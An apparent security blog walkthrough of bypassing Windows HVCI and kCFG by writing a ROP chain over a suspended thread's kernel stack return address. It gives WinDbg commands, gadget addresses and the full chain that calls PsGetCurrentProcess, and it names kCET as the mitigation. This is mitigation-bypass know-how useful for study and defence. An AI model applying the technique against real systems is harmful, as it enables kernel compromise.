# Hijacking Kernel Execution with ROP Chains in the Age of HVCI

*Or: How i stopped worrying about shellcode and learned to love `pop rax; ret`*

---

## Intro

So you got an arbitrary read/write primitive in the Windows kernel. Sick. Now what? Back in the day you'd just drop some shellcode in `KUSER_SHARED_DATA+0x800`, flip a PTE to make it executable, overwrite `HalDispatchTable+0x8`, and call it a day. Token stealing shellcode goes brr, `whoami` says `NT AUTHORITY\SYSTEM`, gg.

But Microsoft said nah. With **HVCI** (Hypervisor-Protected Code Integrity), the hypervisor enforces that no kernel memory page is ever writable **and** executable at the same time. Your shellcode can sit in memory all day long — it's never gonna execute. The EPTEs (Extended Page Table Entries) managed by the hypervisor are the "root of truth" now, and they don't care what your PTE says.

On top of that, **kCFG** (Kernel Control Flow Guard) validates every indirect call against a bitmap of legit targets. And that bitmap? Protected by SLAT. Good luck modifying it with your write primitive.

So... we're cooked? Not quite. There's a neat technique that lets you call **any** kernel-mode API you want, without executing a single byte of unsigned code, without triggering kCFG, and while staying fully HVCI compliant. It's all ROP baby.

This post walks through the full process — from creating a suspended thread to hijacking kernel execution flow with a ROP chain that invokes `nt!PsGetCurrentProcess`. Everything was done live in WinDbg on a Windows 11 VM. Let's get into it.

---

## The Setup

The idea is simple:

1. Create a **suspended thread** from user-mode
2. Leak its **KTHREAD** object to find the kernel-mode stack
3. Find a **return address** on that stack
4. Overwrite it with a **ROP chain**
5. Resume the thread — kernel executes our chain

Why a suspended thread? Because its kernel stack is in a **completely predictable state**. When Windows creates a suspended thread, it goes through the standard initialization path:

```
KiStartUserThread → PspUserThreadStartup → KiApcInterrupt → KiDeliverApc → KeWaitForSingleObject
```

The thread gets an APC queued that tells it to do nothing — that's literally what "suspended" means in kernel terms. The thread is sitting in `KeWaitForSingleObject`, waiting forever, with a perfectly static and predictable call stack. This is our playground.

Why overwrite a **return address** instead of a function pointer? Because kCFG protects forward-edge control flow (indirect `call` instructions) but does **not** protect backward-edge control flow (`ret` instructions). A `ret` just pops a QWORD off the stack and jumps to it — no validation, no bitmap check, nothing. Free real estate.

---

## Step 1 — Find the Process

Our exploit program (`emotions.exe`) is running with a suspended thread. First things first, find it in the kernel:

```
0: kd> !process 0 0 emotions.exe
PROCESS ffffe784fa4dc080
    SessionId: 1  Cid: 17c0    Peb: fdcd7f7000  ParentCid: 0e64
    DirBase: 2c03f002  ObjectTable: ffffab808dfaf480  HandleCount:  67.
    Image: emotions.exe
```

`ffffe784fa4dc080` — that's our **EPROCESS**. The kernel's representation of our process. Remember this address — it'll come back later.

---

## Step 2 — Resolve the Thread Handle

Our program created the suspended thread and got back handle `0x114`. But handles are per-process — they only mean something inside the process that owns them. To translate this into a kernel object, we need to switch WinDbg into our process context:

```
0: kd> .process /i ffffe784fa4dc080
0: kd> g
```

The `.process /i` does an **invasive context switch** — it actually schedules the debugger to run inside our process. This is necessary to resolve handles. After the `g` (continue), the debugger breaks back in and we're inside `emotions.exe`:

```
0: kd> !handle 0x114 f

PROCESS ffffe784fa4dc080
    SessionId: 1  Cid: 17c0    Peb: fdcd7f7000  ParentCid: 0e64

Handle table at ffffab808dfaf480 with 67 entries in use

0114: Object: ffffe784fa4ba080  GrantedAccess: 001fffff (Protected) (Audit)
Object: ffffe784fa4ba080  Type: (ffffe784f...) Thread
    ObjectHeader: ffffe784fa4ba050 (new version)
        HandleCount: 1  PointerCount: 32769
```

The **Object** field gives us `ffffe784fa4ba080` — that's the **KTHREAD**. The kernel's representation of our suspended thread. This is where all the juicy info lives.

---

## Step 3 — Leak the Kernel Stack

Every thread has its own kernel-mode stack. The KTHREAD structure tells us exactly where it is:

```
0: kd> dt nt!_KTHREAD ffffe784fa4ba080 -y Stack
   +0x030 StackLimit : 0xffffbc07`1da94000 Void
   +0x038 StackBase : 0xffffbc07`1da9a000 Void
```

- **StackBase** (`0xffffbc07'1da9a000`) — top of the stack (highest address)
- **StackLimit** (`0xffffbc07'1da94000`) — bottom of the stack (lowest address)

The stack grows downward (toward lower addresses), so the actual content is between these two values. That's 24KB (6 pages) of kernel stack space, and somewhere in there is the return address we need to corrupt.

---

## Step 4 — Hunt the Return Address

We need to find where `nt!KiApcInterrupt+0x2f0` lives on the stack. This is the return address that `KiDeliverApc` will use when it executes `ret`. First, calculate its absolute address:

```
0: kd> ? nt!KiApcInterrupt+0x2f0
Evaluate expression: -8768775427360 = fffff806`5c416ae0
```

Now search the entire stack for this value:

```
0: kd> s -q 0xffffbc07`1da94000 0xffffbc07`1da9a000 fffff806`5c416ae0
ffffbc07`1da99738  fffff806`5c416ae0 00000000`00000000
```

Found it at `ffffbc07'1da99738`. Let's confirm:

```
0: kd> dqs ffffbc07`1da99738 L1
ffffbc07`1da99738  fffff806`5c416ae0 nt!KiApcInterrupt+0x2f0
```

That's our target. When `KiDeliverApc` finishes and executes `ret`, it'll pop the QWORD at this address and jump to it. If we replace it with something else... we control where execution goes.

---

## Step 5 — Find the ROP Gadgets

We need gadgets from `ntoskrnl.exe` — specifically from its `.text` section (which is executable). Using gadgets from data sections would trigger an access violation because HVCI marks those as non-executable. We learned this the hard way:

```
*** Fatal System Error: 0x000000fc
    (ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY)
```

Yeah, `0xFC` bugcheck. Don't be like us. Always verify your gadgets are in `.text`.

The `.text` section of ntoskrnl on this build lives at:

```
start: fffff806`5c21d000   (nt + 0x200000)
end:   fffff806`5c5e2a09   (nt + 0x200000 + 0x3C5A09)
```

**Gadget 1: `pop rax; ret`** (bytes: `58 c3`)

```
0: kd> s -b fffff806`5c21d000 L?3C5A09 58 c3
fffff806`5c21e7f2  58 c3 cc cc cc cc cc cc  X.......
```

The `cc` bytes after are `int 3` padding between functions — this confirms it's a clean gadget at a function boundary, not some random byte sequence in the middle of another instruction.

**Gadget 2: `jmp rax`** (bytes: `ff e0`)

```
0: kd> s -b fffff806`5c21d000 L?3C5A09 ff e0
...
fffff806`5c40e450  ff e0 cc cc cc cc cc cc  ........

0: kd> u fffff806`5c40e450 L1
nt!guard_dispatch_icall_nop:
fffff806`5c40e450 ffe0            jmp     rax
```

Oh the irony. Our `jmp rax` gadget is literally `nt!guard_dispatch_icall_nop` — the CFG dispatch stub that does **no validation**. We're using the CFG infrastructure itself as our gadget. You can't make this stuff up lmao.

**Target function:**

```
0: kd> ? nt!PsGetCurrentProcess
Evaluate expression: ... = fffff806`5c2b0500
```

**Debug breakpoint** (to catch execution after the call):

```
0: kd> ? nt!DbgBreakPoint
Evaluate expression: ... = fffff806`5c41a600
```

---

## Step 6 — Build the ROP Chain

Here's the game plan. We write 4 QWORDs starting at our target return address:

```
ffffbc07`1da99738  →  fffff806`5c21e7f2  (pop rax; ret)
ffffbc07`1da99740  →  fffff806`5c2b0500  (nt!PsGetCurrentProcess)
ffffbc07`1da99748  →  fffff806`5c40e450  (jmp rax)
ffffbc07`1da99750  →  fffff806`5c41a600  (nt!DbgBreakPoint)
```

Write it:

```
0: kd> eq ffffbc07`1da99738 fffff806`5c21e7f2
0: kd> eq ffffbc07`1da99740 fffff806`5c2b0500
0: kd> eq ffffbc07`1da99748 fffff806`5c40e450
0: kd> eq ffffbc07`1da99750 fffff806`5c41a600
```

Verify:

```
0: kd> dqs ffffbc07`1da99738 L4
ffffbc07`1da99738  fffff806`5c21e7f2 nt!FsRtlInitializeFileLock+0x12
ffffbc07`1da99740  fffff806`5c2b0500 nt!PsGetCurrentProcess
ffffbc07`1da99748  fffff806`5c40e450 nt!guard_dispatch_icall_nop
ffffbc07`1da99750  fffff806`5c41a600 nt!DbgBreakPoint
```

Chain is locked and loaded.

---

## Step 7 — Pull the Trigger

Continue execution and resume the thread from user-mode:

```
0: kd> g
```

Press the key in our program to resume the suspended thread. The thread wakes up and the return chain starts unwinding:

`KeWaitForSingleObject` returns → `KiSchedulerApc` returns → `KiDeliverApc` executes `ret`...

And then the magic happens.

```
Break instruction exception - code 80000003 (first chance)
nt!DbgBreakPoint:
fffff806`5c41a600 cc              int     3
```

WinDbg breaks. Let's check the registers:

```
1: kd> r
rax=ffffe784fa4dc080 rbx=fffff806... rcx=...
rdx=ffffe784fa4dc080 rsi=fffff806`5c2b0500 rdi=ffffe784fa205040
rip=fffff806`5c41a600 rsp=ffffbc07`1da99758 rbp=ffffbc07`1da997c0
```

Look at **RAX**: `ffffe784fa4dc080`

Remember our EPROCESS from Step 1?

```
PROCESS ffffe784fa4dc080
    Image: emotions.exe
```

**It's the same address.** `PsGetCurrentProcess` executed successfully and returned the EPROCESS of `emotions.exe` — because the thread that ran the ROP chain belongs to our process.

---

## The Execution Flow, Byte by Byte

Let's trace exactly what happened on the stack:

**1.** `KiDeliverApc` executes `ret`
- CPU pops QWORD at `RSP` (`1da99738`) → gets `fffff806'5c21e7f2` (`pop rax; ret`)
- RIP = `pop rax; ret`, RSP advances to `1da99740`

**2.** `pop rax` executes
- CPU pops QWORD at `RSP` (`1da99740`) → gets `fffff806'5c2b0500` (`PsGetCurrentProcess`)
- RAX = `PsGetCurrentProcess`, RSP advances to `1da99748`

**3.** `ret` executes
- CPU pops QWORD at `RSP` (`1da99748`) → gets `fffff806'5c40e450` (`jmp rax`)
- RIP = `jmp rax`, RSP advances to `1da99750`

**4.** `jmp rax` executes
- CPU jumps to RAX which is `PsGetCurrentProcess`
- RSP stays at `1da99750` (jmp doesn't push anything)

**5.** `PsGetCurrentProcess` executes
- Reads `gs:[0x188]` → gets current KTHREAD
- From KTHREAD derives the EPROCESS → stores in RAX
- Executes `ret` → pops QWORD at `RSP` (`1da99750`)

**6.** `DbgBreakPoint` executes
- `int 3` → WinDbg catches it
- RAX still holds the EPROCESS pointer = `ffffe784fa4dc080`

**We just called a kernel function from a controlled thread, through ROP, with zero shellcode.**

---

## Why This Works Under Modern Mitigations

### vs HVCI

HVCI prevents execution of unsigned code by ensuring no kernel page is ever W+X simultaneously. But we never executed unsigned code. Every single instruction in our ROP chain — `pop rax`, `ret`, `jmp rax`, the body of `PsGetCurrentProcess` — is **signed Microsoft code** that already exists in `ntoskrnl.exe`. We just controlled the **order** these instructions ran by manipulating the stack. HVCI has nothing to complain about.

### vs kCFG

kCFG validates indirect calls (`call rax`, `call [mem]`) against a bitmap of legitimate targets. But we never used an indirect call. Our entire chain is built on `ret` instructions, which pop an address from the stack and jump to it — **no CFG validation happens on `ret`**. kCFG is a forward-edge protection; we attacked the backward-edge.

And our `jmp rax` gadget? It's literally `nt!guard_dispatch_icall_nop` — the CFG stub that **intentionally** does no validation. The system's own CFG infrastructure became our gadget. poetic.

### vs SMEP

SMEP prevents execution of user-mode code from kernel context. Not relevant here — we only execute code that lives in kernel space (`ntoskrnl.exe`).

### vs SMAP

SMAP prevents kernel-mode code from accessing user-mode memory. In a full exploit, we'd save the RAX result (the EPROCESS pointer) to a user-mode address so our program can read it. This works because Windows only enforces SMAP at IRQL >= 2 (DISPATCH_LEVEL), and our thread runs at IRQL 0 (PASSIVE_LEVEL). So kernel→user data access is allowed.

---

## What Stops This? kCET.

Intel's **Control-flow Enforcement Technology** introduces a **shadow stack** — a hardware-protected second stack that stores only return addresses. When `ret` executes, the CPU compares the value popped from the regular stack with the value on the shadow stack. If they don't match → crash.

This kills ROP dead. We can overwrite the regular stack all day, but the shadow stack is protected by hardware and untouchable. Every corrupted return address would cause an immediate `#CP` (Control Protection) exception.

As of the time of this writing, kCET is **not yet enabled** in the Windows kernel on most systems. When it becomes mainstream, this entire technique becomes obsolete. But until then — it's game on.

---

## Summary

```
                    ┌─────────────────────────────┐
                    │   Create Suspended Thread    │
                    │   (predictable stack state)  │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────▼──────────────┐
                    │   Leak KTHREAD via handle    │
                    │   → get StackBase/StackLimit │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────▼──────────────┐
                    │  Search stack for target     │
                    │  return address              │
                    │  (KiApcInterrupt+0x2f0)      │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────▼──────────────┐
                    │  Overwrite with ROP chain:   │
                    │  pop rax; ret                │
                    │  <target function addr>      │
                    │  jmp rax                     │
                    │  <next gadget / cleanup>     │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────▼──────────────┐
                    │  Resume thread               │
                    │  → ROP chain executes        │
                    │  → kernel API called          │
                    │  → profit                    │
                    └─────────────────────────────┘
```

No shellcode. No kCFG violation. HVCI compliant. Just pure stack manipulation and code reuse.

The only thing between this technique and obsolescence is kCET going mainstream. Until then, if you got a kernel read/write — you got kernel API calls. And that's way more powerful than just swapping tokens.

stay curious, stay legal, happy hacking o/